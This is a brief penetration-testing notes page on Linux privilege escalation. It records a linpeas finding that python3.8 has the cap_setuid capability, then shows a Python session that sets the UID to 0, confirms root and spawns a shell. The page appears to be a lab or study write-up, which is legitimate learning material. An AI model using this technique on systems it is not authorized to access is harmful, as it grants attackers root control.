---
title: Python3.8 capability
parent: Lin Privilege Escalation
grand_parent: Red Team
---

# linpeas.sh
![](../../../../../../assets/images/Pasted%20image%2020260503234536.png)

![](../../../../../../assets/images/Pasted%20image%2020260503235120.png)
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip

https://medium.com/@forgecode/linux-privilege-escalation-via-cap-setuid-gaining-root-with-python-ecca7cab716e
```zsh
python3
Python 3.8.5 (default, Jan 27 2021, 15:41:15) 
[GCC 9.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> os.setuid(0)
>>> os.system('whoami')
root
0
>>> os.system('sh')
```
![](../../../../../../assets/images/Pasted%20image%2020260503235833.png)